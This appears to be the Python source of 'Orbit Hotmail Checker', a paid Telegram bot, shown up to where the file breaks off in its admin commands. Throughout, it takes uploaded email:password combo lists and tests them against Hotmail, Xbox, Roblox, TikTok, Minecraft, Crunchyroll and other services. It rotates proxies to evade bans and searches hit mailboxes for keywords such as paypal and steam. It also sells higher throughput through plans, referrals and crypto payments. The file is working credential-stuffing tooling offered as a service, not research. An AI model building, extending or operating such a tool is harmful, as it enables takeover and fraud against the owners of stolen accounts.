#!/usr/bin/env python3
"""
🌍 ORBIT HOTMAIL CHECKER - Complete Telegram Bot
All features, all modes, fully working
"""

import os
import sys
# Ensure project root is in path for local imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__ if '__file__' in dir() else os.getcwd())))
import asyncio
import logging
import time
import secrets
import json
import threading
import tempfile
from datetime import datetime, timedelta
from typing import Optional, Dict, List

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes
)

from core.database import SessionLocal, User, ScanSession, Proxy, CheckResult, AuditLog
from core.scan_queue import scan_queue, ScanJob
from core.alerts import (
    proxy_ratelimited_msg, no_proxies_msg, scan_complete_summary,
    real_time_hit_msg, upgrade_nudge_msg, queue_position_msg,
    proxy_added_success_msg, scan_progress_msg, daily_limit_warning_msg,
)
from core.subscription_monitor import run_subscription_monitor
from core.resilience import CircuitBreakerRegistry
from core.smart_checker import deduplicate_combos, parse_combo_line
from core.discord_webhook import discord_manager
from core.rate_limiter import check_message_rate, check_upload_rate, check_scan_rate
from core.daily_reset import run_daily_reset
from core.domain_filter import filter_combos_by_mode, MS_ONLY_MODES
from core.proxy_validator import validate_proxies, format_proxy_test_result
from core.config import BOT_TOKEN, ADMIN_IDS
from core.database import Plan, Coupon, Payment
from core.oxapay import create_invoice, check_payment, poll_payment
from core.config import OXAPAY_API_KEY, OXAPAY_MERCHANT, PLAN_LIMITS, REFERRAL_BONUS, API_MODES, API_MODE_DESCRIPTIONS, GLOBAL_PROXY_FILE, MAX_QUEUE_FREE, SESSION_MAX_LINES, MAX_FILE_SIZE_BYTES, MAX_FILE_SIZE_MB
from core.proxy_manager import global_proxy_manager
from checker_engine import CheckerEngine

# Load .env file for configuration
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # dotenv optional — use environment variables directly

logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ========== GLOBALS ==========
active_scans: Dict[int, CheckerEngine] = {}

# ========== HELPERS ==========

def _mask_name(name: str) -> str:
    """Privacy masking for leaderboard: JohnDoe → Jo***oe"""
    if not name:
        return "User"
    n = name.lstrip('@')
    if len(n) <= 2:
        return n[0] + '*'
    if len(n) <= 4:
        return n[0] + '*' * (len(n) - 2) + n[-1]
    keep = max(2, len(n) // 4)
    return n[:keep] + '*' * (len(n) - keep * 2) + n[-keep:]


def get_db():
    """Get fresh database session"""
    return SessionLocal()

def get_or_create_user(tid: int, uname: str = None, fname: str = None) -> User:
    db = get_db()
    try:
        u = db.query(User).filter(User.telegram_id == tid).first()
        if not u:
            rc = secrets.token_urlsafe(8)
            while db.query(User).filter(User.referral_code == rc).first():
                rc = secrets.token_urlsafe(8)
            u = User(telegram_id=tid, username=uname, first_name=fname, referral_code=rc)
            db.add(u)
            db.commit()
            db.refresh(u)
        else:
            u.last_active = datetime.utcnow()
            if uname: u.username = uname
            if fname: u.first_name = fname
            db.commit()
            db.refresh(u)
        if u.last_reset and u.last_reset.date() < datetime.utcnow().date():
            u.daily_lines_used = 0
            u.last_reset = datetime.utcnow()
            db.commit()
            db.refresh(u)
        return u
    finally:
        db.close()

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def fmt(n):
    if n >= 1_000_000: return f"{n/1_000_000:.1f}M"
    if n >= 1_000: return f"{n/1_000:.1f}K"
    return str(n)

def esc_md(text: str) -> str:
    """Escape Markdown special characters in text"""
    if not text:
        return ''
    for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:
        text = text.replace(ch, f'\\{ch}')
    return text

def get_plan(u: User) -> dict:
    return PLAN_LIMITS.get(u.plan, PLAN_LIMITS["free"])

def get_mode_name(mode: int) -> str:
    m = API_MODES.get(mode, {})
    if isinstance(m, dict):
        return m.get('name', '🚀 Speed Mode')
    return str(m)

def get_keywords(ctx, uid):
    return ctx.bot_data.get(f'kw_{uid}', [])

def set_keywords(ctx, uid, kws):
    ctx.bot_data[f'kw_{uid}'] = kws

async def send(update, text, kb=None, parse='Markdown'):
    """Smart send - works for both message and callback query"""
    rm = InlineKeyboardMarkup(kb) if kb else None
    if update.callback_query:
        try:
            await update.callback_query.edit_message_text(text, reply_markup=rm, parse_mode=parse)
        except Exception:
            await update.callback_query.message.reply_text(text, reply_markup=rm, parse_mode=parse)
    elif update.message:
        await update.message.reply_text(text, reply_markup=rm, parse_mode=parse)

# ========== MAIN MENU ==========

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db_user = get_or_create_user(u.id, u.username, u.first_name)
    p = get_plan(db_user)
    rem = p["daily"] - db_user.daily_lines_used + db_user.daily_lines_bonus
    sr = (db_user.total_hits / max(db_user.total_lines_checked, 1)) * 100
    kws = get_keywords(context, u.id)

    plan_icon = {"free": "🆓", "weekly": "📅", "monthly": "💎", "yearly": "👑"}.get(db_user.plan, "📅")
    expires_str = db_user.plan_expires.strftime('%m/%d/%Y') if db_user.plan_expires else "Never"
    text = (
        f"🌍 *Orbit Hotmail Checker*\n\n"
        f"👋 Welcome back, *{u.first_name}*!\n\n"
        f"📊 *Your Statistics:*\n"
        f"👤 User ID: `{u.id}`\n"
        f"📅 Registered: {db_user.created_at.strftime('%m/%d/%Y') if db_user.created_at else 'N/A'}\n"
        f"🔥 Membership: {plan_icon} {db_user.plan.upper()}\n"
        f"📅 Expires: {expires_str}\n\n"
        f"📈 *Activity:*\n"
        f"✅ Total Scans: {db_user.total_scans:,}\n"
        f"💎 Total Hits: {db_user.total_hits:,}\n"
        f"🎯 Success Rate: {sr:.2f}%\n"
        f"📊 Today's Lines: {db_user.daily_lines_used:,}\n"
        f"📊 Remaining Today: {fmt(max(0, rem))}\n\n"
        f"⚙️ *Configuration:*\n"
        f"🧵 Threads: {db_user.current_threads}\n"
        f"🔢 API Mode: {get_mode_name(db_user.current_mode)}\n"
        f"🔑 Keywords: {len(kws)}"
    )

    kb = [
        [InlineKeyboardButton("📂 Start Scan", callback_data="scan_start")],
        [InlineKeyboardButton("📦 Multi-Scan Mode", callback_data="scan_multi")],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
            InlineKeyboardButton("📊 My Stats", callback_data="my_stats")
        ],
        [
            InlineKeyboardButton("👑 Membership", callback_data="membership"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="referrals")
        ],
        [InlineKeyboardButton("📞 Support", callback_data="support")]
    ]
    if is_admin(u.id):
        kb.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin")])

    await send(update, text, kb)

# ========== /start COMMAND ==========

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    # Check referral
    if context.args:
        ref_code = context.args[0]
        db = get_db()
        try:
            referrer = db.query(User).filter(User.referral_code == ref_code).first()
            if referrer and referrer.telegram_id != u.id:
                existing = db.query(User).filter(User.telegram_id == u.id).first()
                if not existing:
                    referrer.referral_count += 1
                    referrer.daily_lines_bonus += REFERRAL_BONUS
                    db.commit()
        finally:
            db.close()

    await show_main_menu(update, context)

# ========== CALLBACK ROUTER ==========

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data
    db_user = get_or_create_user(uid, q.from_user.username, q.from_user.first_name)

    # ---- MAIN MENU ----
    if data == "main_menu":
        await show_main_menu(update, context)

    # ---- START SCAN (single file) ----
    elif data == "scan_start":
        mode = db_user.current_mode
        text = (
            f"📂 *Start Scan*\n\n"
            f"🔢 API Mode: *{get_mode_name(mode)}*\n"
            f"🧵 Threads: *{db_user.current_threads}*\n"
            f"🔑 Keywords: *{len(get_keywords(context, uid))}*\n\n"
            f"📤 Send your combo list (.txt file)\n\n"
            f"Format: email:password (one per line)\n\n"
            f"Cancel with /cancel"
        )
        kb = [[InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]]
        await send(update, text, kb)
        context.user_data['state'] = 'waiting_combo'
        context.user_data['multi'] = False

    # ---- MULTI SCAN ----
    elif data == "scan_multi":
        mode = db_user.current_mode
        p = get_plan(db_user)
        text = (
            f"📦 *Multi-Scan Mode*\n\n"
            f"In this mode you can upload 2-{p['files']} .txt files "
            f"and combine them in a single scan.\n\n"
            f"⚙️ *Your Settings:*\n"
            f"🔢 API Mode: {get_mode_name(mode)}\n"
            f"🧵 Threads: {db_user.current_threads}\n"
            f"🔑 Keywords: {len(get_keywords(context, uid))}\n"
            f"📊 Max Files: {p['files']}\n\n"
            f"📤 Now send your files (2-{p['files']} files)\n"
            f"📊 Format: email:password\n\n"
            f"✅ After uploading all files, type /startmulti\n"
            f"❌ Cancel with /cancel"
        )
        kb = [[InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]]
        await send(update, text, kb)
        context.user_data['state'] = 'waiting_combo'
        context.user_data['multi'] = True
        context.user_data['combo_lines'] = []
        context.user_data['file_count'] = 0

    # ---- SETTINGS ----
    elif data == "settings":
        kws = get_keywords(context, uid)
        kw_preview = ', '.join(kws[:5]) if kws else 'None'
        text = (
            f"⚙️ *Settings*\n\n"
            f"🔢 *API Mode:*\n"
            f"{get_mode_name(db_user.current_mode)}\n\n"
            f"🧵 *Threads:* {db_user.current_threads}\n\n"
            f"🔑 *Keywords:* {len(kws)} active\n"
            f"{kw_preview}\n\n"
            f"🔗 *Link Mode:* OFF ❌\n"
            f"📢 *Channel Send:* OFF ❌"
        )
        kb = [
            [InlineKeyboardButton("🔢 API Mode", callback_data="api_mode")],
            [InlineKeyboardButton("🧵 Set Threads", callback_data="set_threads")],
            [InlineKeyboardButton("🔑 Keywords", callback_data="keywords_menu")],
            [InlineKeyboardButton("🌐 Proxy Settings", callback_data="proxy_settings")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
        ]
        await send(update, text, kb)

    # ---- API MODE SELECTION ----
    elif data == "api_mode" or data == "change_mode":
        text = "🔢 *API Mode Selection*\n\n"
        for mid, mdata in API_MODES.items():
            vip_tag = " _(VIP Only)_" if mdata.get('vip') else ""
            text += f"{mid}. *{mdata['name']}*{vip_tag}\n{mdata['desc']}\n\n"
        text += "⚡ Mode 7 recommended for 2k+ CPM!"

        kb = [
            [InlineKeyboardButton("🔥 All-in-One Check", callback_data="setmode_1")],
            [InlineKeyboardButton("🎮 Supercell Check", callback_data="setmode_2")],
            [InlineKeyboardButton("🎮 Roblox Check", callback_data="setmode_3")],
            [InlineKeyboardButton("🎮 Xbox Check", callback_data="setmode_4")],
            [InlineKeyboardButton("📱 TikTok Check", callback_data="setmode_5")],
            [InlineKeyboardButton("📊 Full Scan", callback_data="setmode_6")],
            [InlineKeyboardButton("🚀 Speed Mode", callback_data="setmode_7")],
            [InlineKeyboardButton("⛏️ Minecraft Check", callback_data="setmode_8")],
            [InlineKeyboardButton("🎯 Microsoft Check", callback_data="setmode_9")],
            [InlineKeyboardButton("🍥 Crunchyroll Check", callback_data="setmode_10")],
            [InlineKeyboardButton("🔙 Settings", callback_data="settings")]
        ]
        await send(update, text, kb)

    elif data.startswith("setmode_"):
        mode = int(data.split("_")[1])
        mdata = API_MODES.get(mode, {})

        db = get_db()
        try:
            usr = db.query(User).filter(User.telegram_id == uid).first()
            if usr:
                # VIP check
                if mdata.get('vip') and usr.plan == "free":
                    await send(update, "❌ This mode is VIP only!\n\nUpgrade: /start → 👑 Membership",
                               [[InlineKeyboardButton("🔙 API Modes", callback_data="api_mode")]])
                    return
                usr.current_mode = mode
                db.commit()
        finally:
            db.close()

        await send(update, f"✅ API Mode changed to: *{get_mode_name(mode)}*",
                   [[InlineKeyboardButton("🔙 Settings", callback_data="settings")]])

    # ---- SET THREADS ----
    elif data == "set_threads":
        p = get_plan(db_user)
        max_t = p["threads"]
        text = (
            f"🧵 *Set Thread Count*\n\n"
            f"*Limits by plan:*\n"
            f"🆓 Free: 100 | 📅 Weekly: 150 | 📅 Monthly: 200 | 📅 Yearly: 250\n\n"
            f"Your plan allows *100-{max_t}* threads. Enter a number (min 100).\n\n"
            f"Current: {db_user.current_threads}\n\n"
            f"Cancel with /cancel"
        )
        kb = [[InlineKeyboardButton("🔙 Settings", callback_data="settings")]]
        await send(update, text, kb)
        context.user_data['state'] = 'set_threads'

    # ---- KEYWORDS MENU ----
    elif data == "keywords_menu":
        text = (
            "🔑 *Keyword Management*\n\n"
            "Keywords are searched within emails.\n"
            "Example: paypal, steam, amazon, netflix\n\n"
            "How would you like to add keywords?"
        )
        kb = [
            [InlineKeyboardButton("✏️ Manual Entry", callback_data="kw_manual")],
            [InlineKeyboardButton("📂 Upload File", callback_data="kw_upload")],
            [InlineKeyboardButton("📋 View List", callback_data="kw_view")],
            [InlineKeyboardButton("🗑️ Clear All", callback_data="kw_clear")],
            [InlineKeyboardButton("🔙 Settings", callback_data="settings")]
        ]
        await send(update, text, kb)

    elif data == "kw_manual":
        await send(update, "🔑 Send keywords separated by commas:\n\nExample: `paypal, steam, netflix, amazon`",
                   [[InlineKeyboardButton("🔙 Keywords", callback_data="keywords_menu")]])
        context.user_data['state'] = 'add_keywords'

    elif data == "kw_view":
        kws = get_keywords(context, uid)
        if kws:
            kw_list = '\n'.join([f"• {k}" for k in kws])
            text = f"🔑 *Your Keywords ({len(kws)}):*\n\n{kw_list}"
        else:
            text = "🔑 No keywords set."
        await send(update, text, [[InlineKeyboardButton("🔙 Keywords", callback_data="keywords_menu")]])

    elif data == "kw_clear":
        set_keywords(context, uid, [])
        await send(update, "🗑️ All keywords cleared!",
                   [[InlineKeyboardButton("🔙 Keywords", callback_data="keywords_menu")]])

    elif data == "kw_upload":
        await send(update, "📂 Send a .txt file with keywords (one per line)",
                   [[InlineKeyboardButton("🔙 Keywords", callback_data="keywords_menu")]])
        context.user_data['state'] = 'upload_keywords'

    # ---- PROXY SETTINGS ----
    elif data == "proxy_settings":
        db = get_db()
        try:
            proxy_count = db.query(Proxy).filter(Proxy.user_id == uid, Proxy.is_active == True).count()
        finally:
            db.close()
        text = (
            f"🌐 *Proxy Settings*\n\n"
            f"📊 Active Proxies: {proxy_count}\n\n"
            f"Upload a .txt file with proxies:\n"
            f"`http://ip:port`\n"
            f"`socks5://user:pass@ip:port`\n"
            f"`ip:port`"
        )
        kb = [
            [InlineKeyboardButton("📤 Upload Proxies", callback_data="proxy_upload")],
            [InlineKeyboardButton("📋 View Proxies", callback_data="proxy_view")],
            [InlineKeyboardButton("🗑️ Clear All", callback_data="proxy_clear")],
            [InlineKeyboardButton("🔙 Settings", callback_data="settings")]
        ]
        await send(update, text, kb)

    elif data == "proxy_upload":
        await send(update, "📤 Send a .txt file with proxies (one per line)",
                   [[InlineKeyboardButton("🔙 Proxy Settings", callback_data="proxy_settings")]])
        context.user_data['state'] = 'upload_proxies'

    elif data == "proxy_view":
        db = get_db()
        try:
            proxies = db.query(Proxy).filter(Proxy.user_id == uid, Proxy.is_active == True).limit(10).all()
            if proxies:
                lines = [f"• `{p.proxy_string[:40]}`" for p in proxies]
                text = f"📋 *Your Proxies:*\n\n" + "\n".join(lines)
            else:
                text = "📋 No proxies loaded."
        finally:
            db.close()
        await send(update, text, [[InlineKeyboardButton("🔙 Proxy Settings", callback_data="proxy_settings")]])

    elif data == "proxy_clear":
        db = get_db()
        try:
            db.query(Proxy).filter(Proxy.user_id == uid).delete()
            db.commit()
        finally:
            db.close()
        await send(update, "🗑️ All proxies cleared!",
                   [[InlineKeyboardButton("🔙 Proxy Settings", callback_data="proxy_settings")]])

    # ---- MY STATS ----
    elif data == "my_stats":
        p = get_plan(db_user)
        rem = p["daily"] - db_user.daily_lines_used + db_user.daily_lines_bonus
        sr = (db_user.total_hits / max(db_user.total_lines_checked, 1)) * 100
        text = (
            f"📊 *Your Statistics*\n\n"
            f"👤 User ID: `{uid}`\n"
            f"📅 Registered: {db_user.created_at.strftime('%m/%d/%Y')}\n"
            f"👑 Membership: 📅 {db_user.plan.upper()}\n"
            f"📅 Expires: {db_user.plan_expires.strftime('%m/%d/%Y') if db_user.plan_expires else 'Never'}\n\n"
            f"📈 *Activity:*\n"
            f"✅ Total Scans: {db_user.total_scans:,}\n"
            f"💎 Total Hits: {db_user.total_hits:,}\n"
            f"📊 Total Lines: {db_user.total_lines_checked:,}\n"
            f"🎯 Success Rate: {sr:.2f}%\n"
            f"📊 Today's Scans: {db_user.daily_lines_used:,}\n"
            f"📊 Remaining Today: {fmt(max(0, rem))}\n\n"
            f"⚙️ *Configuration:*\n"
            f"🧵 Threads: {db_user.current_threads}\n"
            f"🔢 API Mode: {db_user.current_mode}\n"
            f"🔑 Keywords: {len(get_keywords(context, uid))}"
        )
        kb = [[InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]]
        await send(update, text, kb)

    # ---- REFERRALS ----
    elif data == "referrals":
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start={db_user.referral_code}"
        p = get_plan(db_user)
        base = p["daily"]
        text = (
            f"🔗 *Referral System*\n\n"
            f"📊 *Your Statistics:*\n"
            f"✅ Referral Count: {db_user.referral_count}\n"
            f"📈 Your Daily Limit: {base:,} lines\n"
            f"💰 Bonus: +{db_user.referral_count * REFERRAL_BONUS:,} lines\n\n"
            f"🎁 *Earn +{REFERRAL_BONUS} lines for each referral!*\n\n"
            f"🔗 *Your Referral Link:*\n"
            f"`{ref_link}`\n\n"
            f"📤 Share this link with your friends!\n"
            f"Your daily limit increases by {REFERRAL_BONUS:,} lines for "
            f"each person who registers using your link.\n\n"
            f"💡 *Example:*\n"
            f"• 0 referrals = {base:,} lines/day\n"
            f"• 1 referral = {base + REFERRAL_BONUS:,} lines/day\n"
            f"• 5 referrals = {base + 5*REFERRAL_BONUS:,} lines/day\n"
            f"• 10 referrals = {base + 10*REFERRAL_BONUS:,} lines/day"
        )
        kb = [[InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]]
        await send(update, text, kb)

    # ---- MEMBERSHIP ----
    elif data == "membership":
        db2 = get_db()
        try:
            plans = get_active_plans(db2)
            expires = db_user.plan_expires.strftime("%d/%m/%Y") if db_user.plan_expires else "Never"
            plan_icon = {"free":"🆓","weekly":"📅","monthly":"💎","yearly":"👑"}
            cur_ic = plan_icon.get(db_user.plan, "📅")
            header = f"👑 *Membership Plans*\n\nYour plan: {cur_ic} *{db_user.plan.upper()}* · expires {expires}\n\n"
            kb = []
            if plans:
                lines = [header]
                for p in plans:
                    daily_str = "∞ daily" if p.daily_limit >= 999999 else f"{p.daily_limit:,}/day"
                    lines.append(
                        f"*{p.name}* — ${p.price_usd:.2f}\n"
                        f"⏳ {p.duration_days} days · {daily_str} · 🧵 {p.threads} threads\n"
                        + (f"_{p.description}_\n" if p.description else "")
                    )
                    kb.append([InlineKeyboardButton(
                        f"💳 Buy {p.name} — ${p.price_usd:.2f}",
                        callback_data=f"buy_plan_{p.id}"
                    )])
                text = "\n".join(lines)
            else:
                text = header + "_No plans available yet. Contact admin to set up plans._"
            kb.append([InlineKeyboardButton("🎟️ Redeem Coupon", callback_data="redeem_coupon")])
            kb.append([InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")])
            await send(update, text, kb)
        finally:
            db2.close()

    # ---- SUPPORT ----
    elif data == "support":
        text = (
            "📞 *Support & Contact*\n\n"
            "Need help or want to upgrade?\n\n"
            "📱 Contact: @KansOrbit\n"
            "🔗 Link: https://t.me/KansOrbit\n\n"
            "💼 Developer: Orbit\n\n"
            "⚡ For custom features, bulk orders, or "
            "enterprise solutions, contact us directly!"
        )
        kb = [
            [InlineKeyboardButton("📞 Contact Support", url="https://t.me/KansOrbit")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
        ]
        await send(update, text, kb)

    # ========== ADMIN PANEL ==========
    elif data == "admin" and is_admin(uid):
        db = get_db()
        try:
            from sqlalchemy import func
            total_users = db.query(User).count()
            total_scans = db.query(func.sum(User.total_scans)).scalar() or 0
            total_hits = db.query(func.sum(User.total_hits)).scalar() or 0
            banned = db.query(User).filter(User.is_banned == True).count()
            vip = db.query(User).filter(User.plan != "free").count()
            active = db.query(User).filter(
                User.last_active >= datetime.utcnow() - timedelta(hours=24)
            ).count()
        finally:
            db.close()
        ps = global_proxy_manager.stats()
        text = (
            f"👑 *ADMIN PANEL*\n\n"
            f"📊 *Statistics:*\n"
            f"👥 Total Users: {total_users:,}\n"
            f"🟢 Active (24h): {active:,}\n"
            f"💎 VIP Users: {vip:,}\n"
            f"🚫 Banned: {banned:,}\n"
            f"⚡ Active Scans: {len(active_scans)}\n"
            f"📈 Total Scans: {total_scans:,}\n"
            f"✅ Total Hits: {total_hits:,}\n\n"
            f"🌐 *Proxies:*\n"
            f"📊 Total: {ps['total']} | ✅ Available: {ps['available']}\n"
            f"🚫 Banned: {ps['banned']} | 💀 Dead: {ps['dead']}\n"
            f"📈 Success Rate: {ps['success_rate']:.1f}%"
        )
        kb = [
            [InlineKeyboardButton("💎 Add VIP", callback_data="adm_addvip"),
             InlineKeyboardButton("❌ Remove VIP", callback_data="adm_rmvip")],
            [InlineKeyboardButton("🚫 Ban User", callback_data="adm_ban"),
             InlineKeyboardButton("✅ Unban User", callback_data="adm_unban")],
            [InlineKeyboardButton("🌐 Global Proxies", callback_data="adm_proxy")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
            [InlineKeyboardButton("👥 View Users", callback_data="adm_users")],
            [InlineKeyboardButton("💰 Add Lines", callback_data="adm_addlines")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
        ]
        await send(update, text, kb)

    # Admin sub-actions
    elif data == "adm_addvip" and is_admin(uid):
        await send(update, "💎 *Add VIP*\n\nSend user ID and plan:\n`/addvip USER_ID PLAN DAYS`\n\nExample: `/addvip 123456789 monthly 30`",
                   [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]])

    elif data == "adm_rmvip" and is_admin(uid):
        await send(update, "❌ *Remove VIP*\n\nSend:\n`/rmvip USER_ID`",
                   [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]])

    elif data == "adm_ban" and is_admin(uid):
        await send(update, "🚫 *Ban User*\n\nSend:\n`/ban USER_ID`",
                   [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]])

    elif data == "adm_unban" and is_admin(uid):
        await send(update, "✅ *Unban User*\n\nSend:\n`/unban USER_ID`",
                   [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]])

    elif data == "adm_broadcast" and is_admin(uid):
        await send(update, "📢 *Broadcast*\n\nSend:\n`/broadcast YOUR MESSAGE`",
                   [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]])

    elif data == "adm_addlines" and is_admin(uid):
        await send(update, "💰 *Add Lines*\n\nSend:\n`/addlines USER_ID AMOUNT`",
                   [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]])

    # ---- ADMIN GLOBAL PROXY ----
    elif data == "adm_proxy" and is_admin(uid):
        ps = global_proxy_manager.stats()
        text = (
            f"🌐 *Global Proxy Manager*\n\n"
            f"📊 *Pool Stats:*\n"
            f"Total: {ps['total']}\n"
            f"✅ Available: {ps['available']}\n"
            f"🚫 Temp Banned: {ps['banned']}\n"
            f"💀 Dead: {ps['dead']}\n"
            f"📈 Success Rate: {ps['success_rate']:.1f}%\n"
            f"🔄 Total Uses: {ps['uses']}\n\n"
            f"All users share this proxy pool.\n"
            f"Upload .txt file with proxies after clicking Upload.\n\n"
            f"*Supported formats:*\n"
            f"`http://ip:port`\n"
            f"`https://ip:port`\n"
            f"`socks4://ip:port`\n"
            f"`socks5://ip:port`\n"
            f"`socks5://user:pass@ip:port`\n"
            f"`ip:port`"
        )
        kb = [
            [InlineKeyboardButton("📤 Upload Proxies", callback_data="adm_proxy_upload")],
            [InlineKeyboardButton("🔬 Test Proxies", callback_data="adm_proxy_test")],
            [InlineKeyboardButton("📋 View Proxies", callback_data="adm_proxy_view")],
            [InlineKeyboardButton("🗑️ Clear All", callback_data="adm_proxy_clear")],
            [InlineKeyboardButton("💀 Remove Dead", callback_data="adm_proxy_clean")],
            [InlineKeyboardButton("🔓 Reset Bans", callback_data="adm_proxy_resetbans")],
            [InlineKeyboardButton("🔙 Admin", callback_data="admin")]
        ]
        await send(update, text, kb)

    elif data == "adm_proxy_upload" and is_admin(uid):
        await send(update, "📤 *Upload Global Proxies*\n\nSend a .txt file with proxies now.\nOne proxy per line. All formats supported.",
                   [[InlineKeyboardButton("🔙 Proxy Manager", callback_data="adm_proxy")]])
        context.user_data['state'] = 'upload_global_proxies'

    elif data == "adm_proxy_view" and is_admin(uid):
        ps = global_proxy_manager.stats()
        sample = []
        for p in global_proxy_manager.proxies[:10]:
            status = "✅" if p.available() else ("🚫" if p.banned_until else "💀")
            sample.append(f"{status} `{p.raw[:40]}` | Score: {p.score():.0f}")
        sample_text = "\n".join(sample) if sample else "No proxies loaded"
        text = f"📋 *Global Proxies ({ps['total']} total):*\n\n{sample_text}\n\n_Showing first 10_"
        await send(update, text, [[InlineKeyboardButton("🔙 Proxy Manager", callback_data="adm_proxy")]])

    elif data == "adm_proxy_clear" and is_admin(uid):
        global_proxy_manager.clear_all()
        try: os.remove(GLOBAL_PROXY_FILE)
        except Exception: pass
        await send(update, "🗑️ All global proxies cleared!",
                   [[InlineKeyboardButton("🔙 Proxy Manager", callback_data="adm_proxy")]])

    elif data == "adm_proxy_clean" and is_admin(uid):
        removed = global_proxy_manager.remove_dead()
        global_proxy_manager.save_to_file(GLOBAL_PROXY_FILE)
        await send(update, f"💀 Removed {removed} dead proxies!",
                   [[InlineKeyboardButton("🔙 Proxy Manager", callback_data="adm_proxy")]])

    elif data == "adm_proxy_test" and is_admin(uid):
        ps = global_proxy_manager.stats()
        # Note: residential proxies will always fail connectivity tests
        # because they block test requests — this is NORMAL and expected
        result_text = (
            f"📊 *Proxy Pool Status*\n\n"
            f"📋 Total loaded: `{ps['total']}`\n"
            f"✅ Available: `{ps['available']}`\n"
            f"🚫 Banned: `{ps['banned']}`\n"
            f"💀 Dead: `{ps['dead']}`\n\n"
            f"⚠️ *Note:* Residential & rotating proxies always fail\n"
            f"connectivity tests — this is normal. They work fine\n"
            f"for actual checking. Trust your provider, not this test."
        )
        await send(update, result_text,
                   [[InlineKeyboardButton("🔙 Proxy Manager", callback_data="adm_proxy")]])

    elif data == "adm_proxy_resetbans" and is_admin(uid):
        global_proxy_manager.reset_bans()
        await send(update, "🔓 All proxy bans reset!",
                   [[InlineKeyboardButton("🔙 Proxy Manager", callback_data="adm_proxy")]])

    elif data == "adm_users" and is_admin(uid):
        db = get_db()
        try:
            users = db.query(User).order_by(User.created_at.desc()).limit(20).all()
            lines = []
            for u2 in users:
                status = "🚫" if u2.is_banned else "🟢"
                lines.append(
                    f"{status} `{u2.telegram_id}` | "
                    f"@{u2.username or 'N/A'} | "
                    f"{u2.plan.upper()} | "
                    f"Scans: {u2.total_scans}"
                )
            text = f"👥 *Recent Users (last 20):*\n\n" + "\n".join(lines)
        finally:
            db.close()
        await send(update, text, [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]])

# ========== ADMIN COMMANDS ==========

    # ── Buy plan (OxaPay payment) ─────────────────────────────────────────────
    elif data.startswith("buy_plan_"):
        try:
            plan_id = int(data.split("_")[2])
        except (ValueError, IndexError):
            await q.answer("Invalid plan.", show_alert=True)
            return
        await _handle_buy_plan(update, context, plan_id)

    # ── Redeem coupon ─────────────────────────────────────────────────────────
    elif data == "redeem_coupon":
        context.user_data['state'] = 'waiting_coupon'
        await q.message.reply_text(
            "🎟️ *Redeem Coupon*\n\nType your coupon code:",
            parse_mode='Markdown'
        )


async def addvip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if len(context.args) < 3:
        await update.message.reply_text("Usage: `/addvip USER_ID PLAN DAYS`", parse_mode='Markdown')
        return
    try:
        target_id = int(context.args[0])
        plan = context.args[1].lower()
        days = int(context.args[2])
        if plan not in ['weekly', 'monthly', 'yearly']:
            await update.message.reply_text("❌ Plan must be: weekly, monthly, or yearly")
            return
        db = get_db()
        try:
            u = db.query(User).filter(User.telegram_id == target_id).first()
            if u:
                u.plan = plan
                u.plan_expires = datetime.utcnow() + timedelta(days=days)
                db.commit()
                await update.message.reply_text(f"✅ User `{target_id}` upgraded to *{plan.upper()}* for {days} days!", parse_mode='Markdown')
            else:
                await update.message.reply_text("❌ User not found")
        finally:
            db.close()
    except Exception:
        await update.message.reply_text("❌ Invalid format. Use: `/addvip USER_ID PLAN DAYS`", parse_mode='Markdown')

async def rmvip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: `/rmvip USER_ID`", parse_mode='Markdown')
        return
    try:
        target_id = int(context.args[0])
        db = get_db()
        try:
            u = db.query(User).filter(User.telegram_id == target_id).first()
            if u:
                u.plan = "free"
                u.plan_expires = None
                db.commit()
                await update.message.reply_text(f"✅ User `{target_id}` downgraded to FREE", parse_mode='Markdown')
            else:
                await update.message.reply_text("❌ User not found")
        finally:
            db.close()
    except Exception:
        await update.message.reply_text("❌ Invalid format")

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    try:
        target_id = int(context.args[0])
        db = get_db()
        try:
            u = db.query(User).filter(User.telegram_id == target_id).first()
            if u:
                u.is_banned = True
                db.commit()
                await update.message.reply_text(f"🚫 User `{target_id}` BANNED", parse_mode='Markdown')
        finally:
            db.close()
    except Exception:
        pass

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
